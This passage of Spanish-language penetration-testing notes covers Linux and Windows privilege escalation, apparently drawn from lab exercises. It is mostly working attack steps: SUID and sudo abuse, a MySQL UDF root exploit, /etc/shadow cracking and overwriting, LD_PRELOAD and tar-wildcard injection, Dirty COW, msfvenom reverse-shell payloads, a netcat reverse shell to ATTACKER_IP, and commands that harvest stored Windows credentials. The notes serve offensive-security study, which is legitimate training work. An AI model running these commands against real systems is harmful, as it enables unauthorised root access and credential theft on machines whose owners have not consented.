- [Packet Storm](https://packetstormsecurity.com/): un sitio web que contiene exploits, herramientas de seguridad y recursos para la seguridad informática.
- [SecLists](https://github.com/danielmiessler/SecLists): una colección de listas de palabras, contraseñas y otros recursos útiles para la seguridad informática.

Para explotar vulnerabilidades de forma manual, se debe investigar la vulnerabilidad en cuestión y buscar información sobre cómo explotarla. Esto puede incluir la lectura de código fuente, la realización de ingeniería inversa y la experimentación con diferentes técnicas de explotación.

Es importante tener en cuenta que la explotación de vulnerabilidades sin autorización es ilegal y puede tener graves consecuencias legales. Por lo tanto, siempre se debe obtener permiso antes de realizar cualquier tipo de prueba de penetración o explotación de vulnerabilidades.

## Escalada de privilegios

### Escalada de privilegios mediante SUID/SGID

Para buscar archivos con el bit SUID/SGID activado, se puede utilizar el comando `find / -type f -perm -u=s -o -type f -perm -g=s 2>/dev/null`. Este comando busca archivos con el bit SUID/SGID activado y los enumera.

```bash
find / -type f -perm -u=s -o -type f -perm -g=s 2>/dev/null
```

**Resumen sobre SUID (Set User ID) y Privilegios de Usuario en Linux con Ejemplos de Uso**

**SUID (Set User ID):** El permio SUID es un tipo de permiso que se otorga a un archivo y permite a los usuarios ejecutar el archivo con los permisos de su propietario. Esto puede permitir la ejecución de ciertos comandos con privilegios elevados.

**Ejemplos de Binarios SUID que Permiten Escalada de Privilegios:**

- Nmap
- Vim
- find
- Bash
- More
- Less
- Nano
- cp

**Descubrimiento de Binarios SUID:**
Puedes descubrir binarios SUID en el sistema usando comandos `find` para buscar archivos propiedad de root con los bits de permisos SUID:

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null;

```

**Verificación de Binarios SUID:**
Puedes verificar los binarios SUID encontrados usando el comando `ls -l`. Los binarios con el bit "s" en los permisos se ejecutan con privilegios de root.

**Ejemplo de Verificación con Nmap:**

```bash
ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap

```

**Uso de Binarios SUID para Escalar Privilegios:**

- **Nmap:** Versiones antiguas permiten ejecutar comandos en una shell.
    - Iniciar el modo interactivo de Nmap:
        
        ```
        nmap --interactive
        
        ```
        
    - Ejecutar un shell con privilegios de root:
        
        ```
        nmap> !sh
        
        ```
        
- **Vim:** Permite leer archivos del sistema y ejecutar comandos.
    - Leer archivos con Vim:
        
        ```
        vim.tiny /etc/shadow
        
        ```
        
    - Ejecutar un shell desde Vim:
        
        ```
        vim.tiny
        # Presionar la tecla ESC
        :set shell=/bin/sh
        :shell
        
        ```
        
- **Bash:** Abrir una shell con privilegios de root:
    
    ```
    bash -p
    
    ```
    
- **Less:** Ejecutar una shell con privilegios elevados:
    
    ```
    less /etc/passwd
    !/bin/sh
    
    ```
    
- **cp:** Ejecutar comandos a través de `cp` cuando tiene permisos SUID.
    - Copiar el archivo `/bin/bash` como `/tmp/rootshell`:
        
        ```
        cp /bin/bash /tmp/rootshell
        
        ```
        
    - Ejecutar un shell con privilegios de root:
        
        ```
        /tmp/rootshell -p
        
        ```
        

Es fundamental utilizar binarios SUID de manera responsable, ya que pueden llevar a escaladas de privilegios no autorizadas en sistemas.

### Escalada de privilegios mediante sudo

Para buscar usuarios con permisos de `sudo`, se puede utilizar el comando `sudo -l`. Este comando muestra los comandos que el usuario puede ejecutar con `sudo`.

```bash
sudo -l
```

### Escalada de privilegios mediante kernel

Para buscar vulnerabilidades en el kernel de la máquina, se puede utilizar el comando `uname -a` para obtener la versión del kernel, y buscar vulnerabilidades en internet.

```bash
uname -a
```

### Escalada de Privilegios en Linux: Explotación de Servicios

En ciertos escenarios, la explotación de servicios mal configurados puede llevar a la escalada de privilegios en un sistema Linux. Esta sección muestra una explotación de servicio que involucra el servicio MySQL, el cual se está ejecutando como root y tiene una contraseña en blanco para el usuario "root".

### Explotando el Servicio MySQL

1. Navega al directorio del exploit:
    
    ```bash
    cd /home/user/tools/mysql-udf
    
    ```
    
2. Compila el código del exploit:
    
    ```bash
    gcc -g -c raptor_udf2.c -fPIC
    gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    
    ```
    
3. Conéctate al servicio MySQL como el usuario root (sin contraseña):
    
    ```bash
    mysql -u root
    
    ```
    
4. Ejecuta los siguientes comandos en MySQL para crear una Función Definida por el Usuario (UDF) "do_system" usando el exploit compilado:
    
    ```sql
    use mysql;
    create table foo(line blob);
    insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
    select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    create function do_system returns integer soname 'raptor_udf2.so';
    
    ```
    
5. Utiliza la función creada para copiar `/bin/bash` a `/tmp/rootbash` y establecer el permiso SUID:
    
    ```sql
    select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
    
    ```
    
6. Sal del shell de MySQL:
    
    ```sql
    exit
    
    ```
    
7. Ejecuta el ejecutable `/tmp/rootbash` con la opción `p` para obtener un shell con privilegios de root:
    
    ```bash
    /tmp/rootbash -p
    
    ```
    

Recuerda eliminar el ejecutable `/tmp/rootbash` y salir del shell de root antes de continuar, ya que recrearás este archivo más adelante en el contexto.

```bash
rm /tmp/rootbash
exit

```

Esta explotación muestra cómo un servicio mal configurado de MySQL puede ser explotado para obtener acceso con privilegios de root en un sistema Linux. 

### Permisos de Archivos Débiles - Lectura de /etc/shadow

El archivo /etc/shadow contiene los hash de contraseñas de usuarios y generalmente solo es legible por el usuario root.

Sin embargo, en la máquina virtual, el archivo /etc/shadow tiene permisos de lectura para todo el mundo. Para verificarlo, ejecuta el siguiente comando:

```bash
ls -l /etc/shadow

```

Puedes ver el contenido del archivo /etc/shadow con el siguiente comando:

```bash
cat /etc/shadow

```

Cada línea del archivo representa a un usuario. El hash de la contraseña de un usuario (si lo tiene) se encuentra entre los dos primeros dos puntos (:) de cada línea.

Guarda el hash del usuario root en un archivo llamado `hash.txt` en tu máquina Kali y utiliza la herramienta "john the ripper" para crackearlo. Es posible que debas descomprimir primero el archivo `/usr/share/wordlists/rockyou.txt.gz` y ejecutar el comando usando `sudo`, dependiendo de tu versión de Kali:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

Una vez que hayas crackeado la contraseña, cambia al usuario root usando la contraseña obtenida:

```bash
su root

```

### Permisos de Archivo Débiles - Escritura en /etc/shadow

El archivo /etc/shadow contiene los hash de contraseñas de los usuarios y generalmente solo es legible por el usuario root.

Sin embargo, en la máquina virtual, el archivo /etc/shadow tiene permisos de escritura para todo el mundo. Para verificarlo, ejecuta el siguiente comando:

```bash
ls -l /etc/shadow

```

Puedes generar un nuevo hash de contraseña con una contraseña de tu elección usando el siguiente comando:

```bash
mkpasswd -m sha-512 nuevapasswordaquí

```

Luego, edita el archivo /etc/shadow y reemplaza el hash de contraseña original del usuario root con el que acabas de generar.

Cambiar al usuario root usando la nueva contraseña:

```bash
su root

```

### Permisos de Archivo Débiles - Escritura en /etc/passwd

El archivo /etc/passwd contiene información sobre las cuentas de usuario. Normalmente es legible para todo el mundo, pero generalmente solo es escribible por el usuario root. Históricamente, el archivo /etc/passwd contenía los hash de contraseñas de los usuarios, y algunas versiones de Linux aún permiten que los hash de contraseñas se almacenen ahí.

Sin embargo, en la máquina virtual, el archivo /etc/passwd tiene permisos de escritura para todo el mundo. Para verificarlo, ejecuta el siguiente comando:

```bash
ls -l /etc/passwd

```

Puedes generar un nuevo hash de contraseña con una contraseña de tu elección utilizando el siguiente comando:

```bash
openssl passwd nuevapasswordaquí

```

Luego, edita el archivo /etc/passwd y coloca el hash de contraseña generado entre los dos puntos (:) de la fila del usuario root (reemplazando la "x").

Cambiar al usuario root usando la nueva contraseña:

```bash
su root

```

Como alternativa, puedes copiar la fila del usuario root y agregarla al final del archivo. Cambia la primera instancia de la palabra "root" por "nuevoroot" y coloca el hash de contraseña generado entre los dos puntos (reemplazando la "x").

Ahora cambia al usuario nuevoroot usando la nueva contraseña:

```bash
su nuevoroot

```

### Sudo - Variables de Entorno

Sudo se puede configurar para heredar ciertas variables de entorno del entorno del usuario.

Verifica qué variables de entorno se heredan (busca las opciones env_keep):

```bash
sudo -l

```

Tanto LD_PRELOAD como LD_LIBRARY_PATH se heredan del entorno del usuario. LD_PRELOAD carga un objeto compartido antes que cualquier otro cuando se ejecuta un programa. LD_LIBRARY_PATH proporciona una lista de directorios donde se buscan primero las bibliotecas compartidas.

Crea un objeto compartido utilizando el código ubicado en /home/user/tools/sudo/preload.c:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

```

Ejecuta uno de los programas que tienes permitido ejecutar a través de sudo (se enumeran al ejecutar sudo -l), mientras configuras la variable de entorno LD_PRELOAD con la ruta completa del nuevo objeto compartido:

```bash
sudo LD_PRELOAD=/tmp/preload.so nombre-del-programa-aquí

```

Debería aparecer una shell con privilegios de root. Sal de la shell antes de continuar. Dependiendo del programa que elijas, es posible que también necesites salir de él.

Ejecuta ldd contra el archivo del programa apache2 para ver qué bibliotecas compartidas usa el programa:

```bash
ldd /usr/sbin/apache2

```

Crea un objeto compartido con el mismo nombre que una de las bibliotecas listadas (libcrypt.so.1) utilizando el código ubicado en /home/user/tools/sudo/library_path.c:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

```

Ejecuta apache2 usando sudo, mientras configuras la variable de entorno LD_LIBRARY_PATH en /tmp (donde hemos generado el objeto compartido compilado):

```bash
sudo LD_LIBRARY_PATH=/tmp apache2

```

Debería aparecer una shell con privilegios de root. Sal de la shell. Intenta cambiar el nombre de /tmp/libcrypt.so.1 al nombre de otra biblioteca utilizada por apache2 y vuelve a ejecutar apache2 usando sudo. ¿Funcionó? Si no, intenta descubrir por qué no funcionó y cómo podría modificarse el código library_path.c para que funcione.

### Cron Jobs - Wildcards

Mira el contenido del otro script de trabajo cron:

```bash
cat /usr/local/bin/compress.sh

```

Observa que el comando `tar` se ejecuta con un comodín (*) en tu directorio de inicio.

Echa un vistazo a la página de GTFOBins para `tar`. Observa que `tar` tiene opciones de línea de comandos que te permiten ejecutar otros comandos como parte de una función de checkpoint.

Usa `msfvenom` en tu máquina Kali para generar un archivo binario ELF de shell inverso. Actualiza la dirección IP LHOST en consecuencia:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

```

Transfiere el archivo `shell.elf` a la carpeta `/home/user/` en la VM de Debian (puedes usar `scp` o alojar el archivo en un servidor web en tu máquina Kali y usar `wget`). Asegúrate de que el archivo sea ejecutable:

```bash
chmod +x /home/user/shell.elf

```

Crea estos dos archivos en `/home/user`:

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

```

Cuando se ejecute el comando `tar` en el trabajo cron, el comodín (*) se expandirá para incluir estos archivos. Dado que los nombres de archivo son opciones válidas de línea de comandos para `tar`, `tar` los reconocerá como tales y los tratará como opciones de línea de comandos en lugar de nombres de archivo.

Configura un escucha de netcat en tu máquina Kali en el puerto 4444 y espera a que se ejecute el trabajo cron (no debería tomar más de un minuto). Debería conectarse de vuelta un shell con privilegios de root a tu escucha de netcat.

```bash
nc -nvlp 4444

```

Recuerda salir del shell de root y eliminar todos los archivos que creaste para evitar que el trabajo cron se ejecute nuevamente:

```bash
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf

```

### **SUID / SGID Ejecutables - Posibles Exploits**

Identificar todos los ejecutables con permisos SUID/SGID en la VM de Debian:

```bash
find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null

```

Revisa los resultados y busca posibles exploits conocidos para las versiones específicas de los programas encontrados. Puedes explorar recursos como Exploit-DB, Google y GitHub para encontrar información relevante.

Es importante destacar que algunos ejecutables SUID/SGID podrían tener vulnerabilidades conocidas que permitan la escalada de privilegios local. En caso de encontrar un exploit correspondiente, puedes intentar ejecutarlo en la VM para obtener acceso con privilegios de root.

**Uso de Inyección de Objetos Compartidos (Shared Object Injection) en SUID Ejecutables**

La Inyección de Objetos Compartidos es una técnica que aprovecha la capacidad de los programas para cargar bibliotecas compartidas (archivos con extensión `.so`) dinámicamente durante su ejecución. Si un programa con privilegios elevados (SUID/SGID) carga una biblioteca de este tipo, es posible reemplazar la biblioteca con una propia que ejecute comandos maliciosos, permitiendo obtener acceso a privilegios elevados.

A continuación se presenta un ejemplo genérico de cómo se puede llevar a cabo esta técnica:

1. **Identificar el Objetivo**: Encuentra un ejecutable con permisos SUID o SGID. Puedes usar el comando `find` para buscar estos archivos, como:
    
    ```bash
    find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null
    ```
    
2. **Analizar el Comportamiento**: Ejecuta el ejecutable y observa su comportamiento normal. También es útil rastrear sus llamadas al sistema con `strace` para ver qué archivos intenta abrir o acceder:
    
    ```bash
    strace /ruta/al/ejecutable 2>&1 | grep -iE "open|access|no such file"
    ```
    
3. **Preparar la Biblioteca Maliciosa**: Crea una biblioteca compartida con código malicioso. Puedes usar lenguajes como C para escribir este código. Aquí tienes un ejemplo genérico:
    
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    
    void inject() {
        setuid(0);
        system("/bin/bash -p");
    }
    
    int main() {
        inject();
        return 0;
    }
    
    ```
    
    Compila el código en una biblioteca compartida (archivo `.so`) usando `gcc` o un compilador similar.
    
4. **Reemplazar la Biblioteca**: Coloca la biblioteca maliciosa en una ubicación donde el ejecutable buscará bibliotecas compartidas. Esto podría ser en una ruta específica o en un directorio en la variable de entorno `LD_LIBRARY_PATH`.
5. **Ejecutar el Ejecutable**: Ejecuta el ejecutable. Ahora, en lugar de la biblioteca original, cargará la biblioteca maliciosa y ejecutará el código dentro de ella. Esto podría llevar a obtener una shell con privilegios elevados.
6. **Limpiar Rastros**: Asegúrate de borrar todos los archivos que creaste y revertir cualquier cambio para evitar que la vulnerabilidad sea explotada nuevamente.

**Ejecutables SUID / SGID - Variables de Entorno**

Otra técnica para aprovechar ejecutables con permisos SUID o SGID es la manipulación de las variables de entorno, específicamente aquellas que controlan el PATH. Esta técnica se basa en el hecho de que estos ejecutables a menudo heredan las variables de entorno del usuario que los ejecuta, incluyendo el PATH. Si un programa SUID/SGID intenta ejecutar otros programas sin especificar una ruta absoluta, podrías manipular el PATH para que apunte a una ubicación donde coloques un ejecutable malicioso.

A continuación, se describe cómo llevar a cabo esta técnica:

1. **Identificar el Objetivo**: Encuentra un ejecutable con permisos SUID o SGID que intente ejecutar otros programas sin usar rutas absolutas.
2. **Analizar el Comportamiento**: Ejecuta el ejecutable y observa su comportamiento normal. Esto puede ayudarte a entender qué programas intenta ejecutar.
3. **Analizar el Código de Strings**: Usa el comando `strings` en el ejecutable para buscar cadenas de caracteres imprimibles. Esto podría revelar información sobre cómo el ejecutable interactúa con otros programas.
    
    ```bash
    strings /ruta/al/ejecutable
    ```
    

- **Preparar el Ejecutable Malicioso**: Compila el código malicioso en un ejecutable usando `gcc` o un compilador similar. Asegúrate de que el código genere una shell o realice las acciones deseadas.
- **Manipular la Variable PATH**: Añade el directorio actual (donde se encuentra el ejecutable malicioso) al principio de la variable PATH. Esto asegurará que el ejecutable malicioso se encuentre antes en la lista de rutas de búsqueda.
    
    ```bash
    PATH=.:$PATH /ruta/al/ejecutable
    ```
    

- **Ejecutar el Ejecutable**: Ahora, cuando ejecutes el ejecutable SUID/SGID, la variable PATH manipulada hará que primero se encuentre y ejecute el ejecutable malicioso.

**Ejecutables SUID / SGID - Abuso de Características de la Shell**

El ejecutable /usr/local/bin/suid-env2 es idéntico a /usr/local/bin/suid-env, con la única diferencia de que utiliza la ruta absoluta del ejecutable de servicio (/usr/sbin/service) para iniciar el servidor web apache2.

Verifica esto usando el comando `strings`:

```bash
strings /usr/local/bin/suid-env2
```

En versiones de Bash anteriores a 4.2-048, es posible definir funciones de shell con nombres que se asemejen a rutas de archivos y exportar esas funciones para que se utilicen en lugar de cualquier ejecutable real en esa ruta de archivo.

Verifica la versión de Bash instalada en la VM Debian y asegúrate de que sea menor que 4.2-048:

```bash
/bin/bash --version
```

Crea una función Bash con el nombre "/usr/sbin/service" que ejecute una nueva instancia de la shell Bash (usando -p para preservar permisos) y exporta la función:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Ejecuta el ejecutable suid-env2 para obtener una shell con privilegios de root:

```bash
/usr/local/bin/suid-env2
```

**Ejecutables SUID / SGID - Abuso de Características de la Shell (#2)**

Nota: Esto no funcionará en las versiones de Bash 4.4 y posteriores.

Cuando se encuentra en modo de depuración, Bash utiliza la variable de entorno PS4 para mostrar un prompt adicional para las declaraciones de depuración.

Ejecuta el ejecutable /usr/local/bin/suid-env2 con la depuración de Bash habilitada y la variable PS4 configurada con un comando incrustado que crea una versión SUID de /bin/bash:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Ejecuta el ejecutable /tmp/rootbash con -p para obtener una shell con privilegios de root:

```bash
/tmp/rootbash -p
```

### Archivos NFS Heredados y Squashing de Root

Los archivos creados a través de NFS heredan el ID del usuario remoto. Si el usuario remoto es root y root squashing (restricción de root) está habilitado, el ID se establecerá en el usuario "nobody".

- Verificar la configuración del recurso compartido NFS en la máquina Debian:
    
    ```bash
    cat /etc/exports
    ```
    

El archivo `/etc/exports` contiene la configuración de acceso para los sistemas de archivos que pueden ser exportados a clientes NFS. 

```
# /etc/exports: la lista de control de acceso para los sistemas de archivos que pueden ser exportados
#                a clientes NFS. Consulta exports(5).
#
# Ejemplo para NFSv2 y NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Ejemplo para NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

```

En este ejemplo, se describe la exportación del directorio `/tmp` con varias opciones:

- ``: Este comodín permite que cualquier cliente acceda al directorio especificado.
- `rw`: Los clientes tienen permisos de lectura y escritura en el directorio.
- `sync`: Los datos se escriben de manera síncrona en el disco.
- `insecure`: Permite que los clientes utilicen puertos no seguros al conectarse.
- `no_root_squash`: Deshabilita la función "root squashing", lo que significa que el usuario root en la máquina cliente tiene acceso de nivel root a los archivos en el directorio compartido.
- `no_subtree_check`: Omite la verificación de subárbol para mejorar la confiabilidad y el rendimiento.

1. Montar el recurso compartido en Kali:
    
    ```bash
    sudo su
    mkdir /tmp/nfs
    mount -o rw,vers=3 <IP_del_objetivo>:/tmp /tmp/nfs
    ```
    
    Donde `<IP_del_objetivo>` es la dirección IP de la máquina Debian que comparte el recurso NFS.
    
2. Generar un payload usando msfvenom en Kali y guardarlo en el recurso compartido montado:
    
    ```bash
    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
    ```
    
3. Hacer el archivo ejecutable y establecer el bit SUID:
    
    ```bash
    chmod +xs /tmp/nfs/shell.elf
    ```
    
4. En la máquina Debian, como usuario con privilegios bajos, ejecutar el archivo para obtener una shell con privilegios de root:
    
    ```bash
    /tmp/nfs/shell.elf
    ```
    
    Esto explota el comportamiento de herencia de permisos de NFS y permite ejecutar el archivo con privilegios de root en la máquina objetivo.
    

### **Kernel Exploits**

Los exploits de kernel pueden dejar el sistema en un estado inestable, por lo que solo deberían ejecutarse como último recurso.

Ejecuta la herramienta Linux Exploit Suggester 2 para identificar posibles exploits de kernel en el sistema actual:

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

Debería aparecer listado el popular exploit del kernel Linux "Dirty COW". El código de explotación para Dirty COW se encuentra en /home/user/tools/kernel-exploits/dirtycow/c0w.c. Este exploit reemplaza el archivo SUID /usr/bin/passwd con uno que crea una shell (se realiza una copia de seguridad de /usr/bin/passwd en /tmp/bak).

Compila el código y ejecútalo (ten en cuenta que puede llevar varios minutos completarse):

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

Una vez que el exploit finalice, ejecuta /usr/bin/passwd para obtener una shell con privilegios de root:

```bash
/usr/bin/passwd
```

[https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

[https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

### Listado de Capacidades

Puedes usar el comando `getcap` para listar las capacidades asignadas a archivos en Linux:

```bash
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep

```

Este comando muestra los archivos y sus capacidades asignadas.

**Elevación de Privilegios**

El siguiente comando es un ejemplo de cómo alguien podría utilizar estas capacidades para elevar sus privilegios:

```bash
$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

```

Este comando está ejecutando el editor de texto Vim con la opción `-c`, que le permite ejecutar un comando de Vim después de iniciarse. En este caso, el comando de Vim está utilizando Python (`:py3`) para cambiar el UID (identificador de usuario) al 0 (que es el UID del usuario root) y luego ejecuta una nueva instancia del shell `/bin/sh`, lo que efectivamente proporciona un shell con privilegios de root.

## Windows Privilege Scalation

Instalaciones de Windows sin Supervisión

Cuando se instala Windows en un gran número de sistemas, los administradores pueden utilizar los Servicios de Implementación de Windows, que permiten desplegar una única imagen de sistema operativo en varios sistemas a través de la red. Estos tipos de instalaciones se conocen como instalaciones sin supervisión, ya que no requieren interacción del usuario. Dichas instalaciones necesitan el uso de una cuenta de administrador para realizar la configuración inicial, la cual podría terminar almacenada en la máquina en las siguientes ubicaciones:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

Como parte de estos archivos, es posible encontrar credenciales:

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

```

Historial de PowerShell

Cada vez que un usuario ejecuta un comando utilizando PowerShell, este se almacena en un archivo que lleva un registro de los comandos previos. Esto es útil para repetir rápidamente comandos que se han utilizado anteriormente. Si un usuario ejecuta un comando que incluye una contraseña directamente como parte de la línea de comandos de PowerShell, posteriormente se puede recuperar utilizando el siguiente comando desde un símbolo del sistema de cmd.exe:

```bash
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Nota: El comando anterior solo funcionará desde cmd.exe, ya que PowerShell no reconocerá `%userprofile%` como una variable de entorno. Para leer el archivo desde PowerShell, debes reemplazar `%userprofile%` con `$Env:userprofile`.

Credenciales Guardadas de Windows

Windows permite utilizar las credenciales de otros usuarios. Esta función también brinda la opción de guardar estas credenciales en el sistema. El siguiente comando mostrará las credenciales guardadas:

```bash
cmdkey /list

```

Aunque no puedes ver las contraseñas reales, si notas credenciales que valga la pena intentar, puedes usarlas con el comando runas y la opción /savecred, como se muestra a continuación:

```bash
runas /savecred /user:admin cmd.exe

```

Configuración de IIS (Servicios de Información de Internet)

Los Servicios de Información de Internet (IIS) son el servidor web predeterminado en las instalaciones de Windows. La configuración de sitios web en IIS se almacena en un archivo llamado web.config y puede contener contraseñas para bases de datos o mecanismos de autenticación configurados. Dependiendo de la versión de IIS instalada, podemos encontrar web.config en una de las siguientes ubicaciones:

- C:\inetpub\wwwroot\web.config
- C:\Windows\[Microsoft.NET](http://microsoft.net/)\Framework64\v4.0.30319\Config\web.config

Aquí tienes una forma rápida de encontrar cadenas de conexión de bases de datos en el archivo:

```bash
type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString

```

Recuperación de Credenciales de Software: PuTTY

PuTTY es un cliente SSH comúnmente encontrado en sistemas Windows. En lugar de tener que especificar los parámetros de conexión cada vez, los usuarios pueden almacenar sesiones en las que se pueden guardar la dirección IP, el nombre de usuario y otras configuraciones para su uso posterior. Aunque PuTTY no permite a los usuarios almacenar sus contraseñas SSH, almacenará configuraciones de proxy que incluyen credenciales de autenticación en texto claro.

Para recuperar las credenciales de proxy almacenadas, puedes buscar bajo la siguiente clave del registro para ProxyPassword con el siguiente comando:

```bash
reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s

```

Nota: Simon Tatham es el creador de PuTTY (y su nombre forma parte de la ruta), no es el nombre de usuario del cual estamos recuperando la contraseña. El nombre de usuario del proxy almacenado también debería ser visible después de ejecutar el comando anterior.

Logros Rápidos Adicionales

La escalada de privilegios no siempre es un desafío. Algunas configuraciones incorrectas pueden permitirte obtener un acceso de usuario con privilegios más altos y, en algunos casos, incluso acceso de administrador. Esto se considera más relacionado con eventos de CTF que con escenarios que encontrarías durante pruebas reales de penetración. Sin embargo, si ninguno de los métodos mencionados anteriormente funciona, siempre puedes recurrir a estos.

**Tareas Programadas**

Al examinar las tareas programadas en el sistema de destino, es posible que veas una tarea programada que haya perdido su archivo binario o que esté utilizando un archivo binario que puedas modificar.

Las tareas programadas se pueden listar desde la línea de comandos utilizando el comando `schtasks` sin ninguna opción. Para obtener información detallada sobre cualquiera de los servicios, puedes utilizar un comando como el siguiente:

```bash
schtasks /query /tn vulntask /fo list /v

```

Obtendrás mucha información sobre la tarea, pero lo que nos importa es el parámetro "Task to Run", que indica qué se ejecuta mediante la tarea programada, y el parámetro "Run As User", que muestra el usuario que se utilizará para ejecutar la tarea.

Si nuestro usuario actual puede modificar u sobrescribir el ejecutable de "Task to Run", podemos controlar lo que se ejecuta por el usuario taskusr1, lo que resulta en una escalada de privilegios simple. Para verificar los permisos de archivo en el ejecutable, podemos usar `icacls`:

```bash
icacls c:\\tasks\\schtask.bat

```

Como se puede ver en el resultado, el grupo BUILTIN\Users tiene acceso completo (F) sobre el binario de la tarea. Esto significa que podemos modificar el archivo .bat e insertar cualquier carga útil que deseemos. Para tu conveniencia, nc64.exe se encuentra en C:\tools. Cambiemos el archivo .bat para crear un shell inverso:

```bash
echo c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\\tasks\\schtask.bat

```

Luego, inicia un escuchador en la máquina atacante en el mismo puerto que indicaste en tu shell inverso:

```bash
nc -lvp 4444

```

La próxima vez que se ejecute la tarea programada, recibirás el shell inverso con privilegios de taskusr1. Si bien probablemente no podrías iniciar la tarea en un escenario real y tendrías que esperar a que la tarea programada se active, hemos proporcionado permisos para que tu usuario pueda iniciar la tarea manualmente y ahorrarte tiempo. Podemos ejecutar la tarea con el siguiente comando:

```bash
schtasks /run /tn vulntask

```

Y recibirás el shell inverso con privilegios de taskusr1 como se esperaba.

**AlwaysInstallElevated**

Los archivos de instalación de Windows (también conocidos como archivos .msi) se utilizan para instalar aplicaciones en el sistema. Por lo general, se ejecutan con el nivel de privilegio del usuario que lo inicia. Sin embargo, se pueden configurar para ejecutarse con privilegios más altos desde cualquier cuenta de usuario (incluso las no privilegiadas). Esto podría permitirnos generar un archivo MSI malicioso que se ejecute con privilegios de administrador.

Nota: El método AlwaysInstallElevated no funcionará en la máquina de esta sala y se incluye solo como información.

Este método requiere que se configuren dos valores del registro. Puedes consultarlos desde la línea de comandos utilizando los comandos a continuación:

```bash
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer

```

Para explotar esta vulnerabilidad, ambos deben estar configurados. De lo contrario, la explotación no será posible. Si están configurados, puedes generar un archivo .msi malicioso utilizando `msfvenom`, como se muestra a continuación:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

```

Dado que se trata de un shell inverso, también debes ejecutar el módulo Handler de Metasploit configurado en consecuencia. Una vez que hayas transferido el archivo que has creado, puedes ejecutar el instalador con el siguiente comando y recibir el shell inverso:

```bash
msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi

```

Este material debe utilizarse de manera ética y solo en entornos autorizados.

### Enlaces utiles

- [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
- [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

# Buffer Overflows

